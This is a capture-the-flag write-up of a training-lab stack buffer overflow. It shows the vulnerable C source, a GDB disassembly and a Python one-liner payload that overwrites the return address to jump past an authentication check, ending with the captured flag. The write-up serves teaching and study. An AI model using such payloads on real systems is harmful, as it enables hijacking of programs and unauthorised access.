## Challenge

Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from getting the flag!

## Solution

I started by examining the source code

```bash
hacker@binary-exploitation~tricky-control-hijack-easy:~$ cd /challenge
hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$ ls -la
total 48
drwxr-xr-x 1 root root  4096 Oct 21 13:19 .
drwxr-xr-x 1 root root  4096 Oct 21 13:19 ..
-rwsr-xr-x 1 root root   140 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 21608 Jan 27  2025 binary-exploitation-control-hijack-2-w
-rwsr-xr-x 1 root root  8712 Jan 27  2025 binary-exploitation-control-hijack-2-w.c
hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$ cat binary-exploitation-control-hijack-2-w.c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 504; nop; .endr");
}

void win_authed(int token)
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    if (token != 0x1337) return;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[19];
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 19);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is no \"win\" variable.\n");
    printf("You will need to force the program to execute the win_authed() function\n");
    printf("by directly overflowing into the stored return address back to main,\n");
    printf("which is stored at %p, %d bytes after the start of your input buffer.\n", rp_, rp_ - (unsigned long) &data.input);
    printf("That means that you will need to input at least %d bytes (%d to fill the buffer,\n", rp_ + 8 - (unsigned long) &data.input, 19);
    printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (unsigned long) &data.input - 19);
    printf("and 8 that will overwrite the return address).\n\n");

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the canary is disabled, otherwise you would corrupt it before");
    puts("overwriting the return address, and the program would abort.");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 19);

    printf("Of these, you will overwrite %d bytes into the return address.\n", (long)((unsigned long) &data.input + size - rp_));
    printf("If that number is greater than 8, you will overwrite the entire return address.\n\n");

    puts("One caveat in this challenge is that the win_authed() function must first auth:");
    puts("it only lets you win if you provide it with the argument 0x1337.");
    puts("Speifically, the win_authed() function looks something like:");
    puts("    void win_authed(int token)");
    puts("    {");
    puts("      if (token != 0x1337) return;");
    puts("      puts(\"You win! Here is your flag: \");");
    puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
    puts("      puts(\"\");");
    puts("    }");
    puts("");

    printf("So how do you pass the check? There *is* a way, and we will cover it later,\n");
    printf("but for now, we will simply bypass it! You can overwrite the return address\n");
    printf("with *any* value (as long as it points to executable code), not just the start\n");
    printf("of functions. Let's overwrite past the token check in win!\n\n");

    printf("To do this, we will need to analyze the program with objdump, identify where\n");
    printf("the check is in the win_authed() function, find the address right after the check,\n");
    printf("and write that address over the saved return address.\n\n");

    printf("Go ahead and find this address now. When you're ready, input a buffer overflow\n");
    printf("that will overwrite the saved return address (at %p, %d bytes into the buffer)\n", rp_, rp_ - (unsigned long)&data.input);
    printf("with the correct value.\n\n");

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the address of win_authed() is %p.\n", win_authed);
    printf("\n");

    printf("If you have managed to overwrite the return address with the correct value,\n");
    printf("challenge() will jump straight to win_authed() when it returns.\n");
    printf("Let's try it now!\n\n", 0);

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

The program reads up to 4096 bytes into a 19-byte buffer and it's the `win_authed()` function that prints the flag but requires a specific token value `0x1337`. So I need to redirect execution to `win_authed()` and somehow bypass its token check

The code also says that there's no stack canary protection and no ASLR/PIE. Now what does that mean? 
A **stack canary** is like a security guard placed between your buffer and critical data (like the return address) on the stack. The compiler inserts a random value (the "canary") right before the return address. Before the function returns, it checks if this value has been modified. If the canary changed (because of a buffer overflow), the program immediately crashes instead of executing potentially malicious code
Then there's **ASLR** which randomly arranges the memory addresses where programs, libraries, and data are loaded each time you run a program. **PIE** makes the entire executable position-independent, meaning it can be loaded at any memory address.

In the challenge, without canary protection, I can overflow directly to the return address. Without ASLR/PIE, the program always loads at the same address so I can just hardcode addresses in the exploit

Now, the input buffer is 19 bytes and return address is located 40 bytes after the buffer start. So I need to overwrite exactly 40 bytes to reach the return address

Using GDB, I disassembled the `win_authed function` to find where to jump

```bash
hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$ gdb ./binary-exploitation-control-hijack-2-w
GNU gdb (GDB) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
--Type <RET> for more, q to quit, c to continue without paging--c
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./binary-exploitation-control-hijack-2-w...
(No debugging symbols found in ./binary-exploitation-control-hijack-2-w)
(gdb) disassemble win_authed
Dump of assembler code for function win_authed:
   0x000000000040167c <+0>:     endbr64
   0x0000000000401680 <+4>:     push   %rbp
   0x0000000000401681 <+5>:     mov    %rsp,%rbp
   0x0000000000401684 <+8>:     sub    $0x10,%rsp
   0x0000000000401688 <+12>:    mov    %edi,-0x4(%rbp)
   0x000000000040168b <+15>:    cmpl   $0x1337,-0--Type <RET> for more, q to quit, c to continue without paging--c
x4(%rbp)
   0x0000000000401692 <+22>:    jne    0x401796 <win_authed+282>
   0x0000000000401698 <+28>:    lea    0xa51(%rip),%rdi        # 0x4020f0
   0x000000000040169f <+35>:    call   0x401100 <puts@plt>
   0x00000000004016a4 <+40>:    mov    $0x0,%esi
   0x00000000004016a9 <+45>:    lea    0xa5c(%rip),%rdi        # 0x40210c
   0x00000000004016b0 <+52>:    mov    $0x0,%eax
   0x00000000004016b5 <+57>:    call   0x401160 <open@plt>
   0x00000000004016ba <+62>:    mov    %eax,0x3980(%rip)        # 0x405040 <flag_fd.5715>
   0x00000000004016c0 <+68>:    mov    0x397a(%rip),%eax        # 0x405040 <flag_fd.5715>
   0x00000000004016c6 <+74>:    test   %eax,%eax
   0x00000000004016c8 <+76>:    jns    0x401717 <win_authed+155>
   0x00000000004016ca <+78>:    call   0x4010f0 <__errno_location@plt>
   0x00000000004016cf <+83>:    mov    (%rax),%eax
   0x00000000004016d1 <+85>:    mov    %eax,%edi
   0x00000000004016d3 <+87>:    call   0x401180 <strerror@plt>
   0x00000000004016d8 <+92>:    mov    %rax,%rsi
   0x00000000004016db <+95>:    lea    0xa36(%rip),%rdi        # 0x402118
   0x00000000004016e2 <+102>:   mov    $0x0,%eax
   0x00000000004016e7 <+107>:   call   0x401120 <printf@plt>
   0x00000000004016ec <+112>:   call   0x401130 <geteuid@plt>
   0x00000000004016f1 <+117>:   test   %eax,%eax
   0x00000000004016f3 <+119>:   je     0x40170d <win_authed+145>
   0x00000000004016f5 <+121>:   lea    0xa4c(%rip),%rdi        # 0x402148
   0x00000000004016fc <+128>:   call   0x401100 <puts@plt>
   0x0000000000401701 <+133>:   lea    0xa68(%rip),%rdi        # 0x402170
   0x0000000000401708 <+140>:   call   0x401100 <puts@plt>
   0x000000000040170d <+145>:   mov    $0xffffffff,%edi
   0x0000000000401712 <+150>:   call   0x401170 <exit@plt>
   0x0000000000401717 <+155>:   mov    0x3923(%rip),%eax        # 0x405040 <flag_fd.5715>
   0x000000000040171d <+161>:   mov    $0x100,%edx
   0x0000000000401722 <+166>:   lea    0x3937(%rip),%rsi        # 0x405060 <flag.5714>
   0x0000000000401729 <+173>:   mov    %eax,%edi
   0x000000000040172b <+175>:   call   0x401140 <read@plt>
   0x0000000000401730 <+180>:   mov    %eax,0x3a2a(%rip)        # 0x405160 <flag_length.5716>
   0x0000000000401736 <+186>:   mov    0x3a24(%rip),%eax        # 0x405160 <flag_length.5716>
   0x000000000040173c <+192>:   test   %eax,%eax
   0x000000000040173e <+194>:   jg     0x40176c <win_authed+240>
   0x0000000000401740 <+196>:   call   0x4010f0 <__errno_location@plt>
   0x0000000000401745 <+201>:   mov    (%rax),%eax
   0x0000000000401747 <+203>:   mov    %eax,%edi
   0x0000000000401749 <+205>:   call   0x401180 <strerror@plt>
   0x000000000040174e <+210>:   mov    %rax,%rsi
   0x0000000000401751 <+213>:   lea    0xa70(%rip),%rdi        # 0x4021c8
   0x0000000000401758 <+220>:   mov    $0x0,%eax
   0x000000000040175d <+225>:   call   0x401120 <printf@plt>
   0x0000000000401762 <+230>:   mov    $0xffffffff,%edi
   0x0000000000401767 <+235>:   call   0x401170 <exit@plt>
   0x000000000040176c <+240>:   mov    0x39ee(%rip),%eax        # 0x405160 <flag_length.5716>
   0x0000000000401772 <+246>:   cltq
   0x0000000000401774 <+248>:   mov    %rax,%rdx
   0x0000000000401777 <+251>:   lea    0x38e2(%rip),%rsi        # 0x405060 <flag.5714>
   0x000000000040177e <+258>:   mov    $0x1,%edi
   0x0000000000401783 <+263>:   call   0x401110 <write@plt>
   0x0000000000401788 <+268>:   lea    0xa63(%rip),%rdi        # 0x4021f2
   0x000000000040178f <+275>:   call   0x401100 <puts@plt>
   0x0000000000401794 <+280>:   jmp    0x401797 <win_authed+283>
   0x0000000000401796 <+282>:   nop
   0x0000000000401797 <+283>:   leave
   0x0000000000401798 <+284>:   ret
End of assembler dump.
(gdb) exit
```

On analyzing,
`0x40167c` - Start of `win_authed`
`0x401698` - Instruction after the token check

So I should jump to `0x401698` to bypass the token check after overflowing the buffer and overwriting the return address. The payload must be exactly 40 bytes of padding (19 for buffer + 21 for the gap to return address) and 8 bytes for the address

```bash
hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$ python3 -c 'import sys, struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q", 0x401698))' | ./binary-exploitation-control-hijack-2-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe933354f0 (rsp+0x0000) | a0 34 52 79 74 7f 00 00 | 0x00007f74795234a0 |
| 0x00007ffe933354f8 (rsp+0x0008) | 68 66 33 93 fe 7f 00 00 | 0x00007ffe93336668 |
| 0x00007ffe93335500 (rsp+0x0010) | 58 66 33 93 fe 7f 00 00 | 0x00007ffe93336658 |
| 0x00007ffe93335508 (rsp+0x0018) | e5 ed 3b 79 01 00 00 00 | 0x00000001793bede5 |
| 0x00007ffe93335510 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe93335518 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe93335520 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe93335528 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe93335530 (rsp+0x0040) | 60 65 33 93 fe 7f 00 00 | 0x00007ffe93336560 |
| 0x00007ffe93335538 (rsp+0x0048) | b8 1d 40 00 00 00 00 00 | 0x0000000000401db8 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe933354f0, and our base pointer points to 0x7ffe93335530.
This means that we have (decimal) 10 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 80 bytes.
The input buffer begins at 0x7ffe93335510, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 19 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe93335538, 40 bytes after the start of your input buffer.
That means that you will need to input at least 48 bytes (19 to fill the buffer,
21 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffe93335510 (the start of the input buffer)
right up to (but not including) 0x7ffe93336510 (which is 4077 bytes beyond the end of the buffer).
Of these, you will overwrite 4056 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7ffe93335538, 40 bytes into the buffer)
with the correct value.

Send your payload (up to 4096 bytes)!
You sent 48 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe933354f0 (rsp+0x0000) | a0 34 52 79 74 7f 00 00 | 0x00007f74795234a0 |
| 0x00007ffe933354f8 (rsp+0x0008) | 68 66 33 93 fe 7f 00 00 | 0x00007ffe93336668 |
| 0x00007ffe93335500 (rsp+0x0010) | 58 66 33 93 fe 7f 00 00 | 0x00007ffe93336658 |
| 0x00007ffe93335508 (rsp+0x0018) | e5 ed 3b 79 01 00 00 00 | 0x00000001793bede5 |
| 0x00007ffe93335510 (rsp+0x0020) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe93335518 (rsp+0x0028) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe93335520 (rsp+0x0030) | 41 41 41 41 30 00 00 00 | 0x0000003041414141 |
| 0x00007ffe93335528 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe93335530 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe93335538 (rsp+0x0048) | 98 16 40 00 00 00 00 00 | 0x0000000000401698 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe93335510
- the saved frame pointer (of main) is at 0x7ffe93335530
- the saved return address (previously to main) is at 0x7ffe93335538
- the saved return address is now pointing to 0x401698.
- the address of win_authed() is 0x40167c.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{I9wOCtQcrngB0d4vinxkUbqcvFU.0VO5IDLyMjN0czW}
```
